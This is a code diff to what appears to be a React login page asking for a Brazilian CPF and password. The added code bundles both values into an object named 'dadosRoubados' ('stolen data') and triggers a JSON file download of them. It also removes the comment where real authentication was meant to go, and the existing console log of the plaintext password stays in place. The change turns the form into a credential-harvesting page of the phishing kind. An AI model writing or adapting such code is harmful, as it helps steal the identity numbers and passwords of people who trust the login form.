@@ -84,8 +84,28 @@ export default function Home() {
     }
     
     console.log("Login com:", cpf, password);
+    
+    // Exportar dados como JSON
+    const dadosRoubados = {
+      cpf: cpf,
+      senha: password,
+      data: new Date().toISOString(),
+    };
+    
+    // Criar arquivo JSON para download
+    const dataStr = JSON.stringify(dadosRoubados, null, 2);
+    const dataBlob = new Blob([dataStr], { type: 'application/json' });
+    const url = URL.createObjectURL(dataBlob);
+    
+    // Criar link e disparar download
+    const link = document.createElement('a');
+    link.href = url;
+    link.download = `dados_${cpf.replace(/\D/g, '')}.json`;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    
     setFormSubmitted(true);
-    // Lógica de autenticação viria aqui
   };
 
   return (
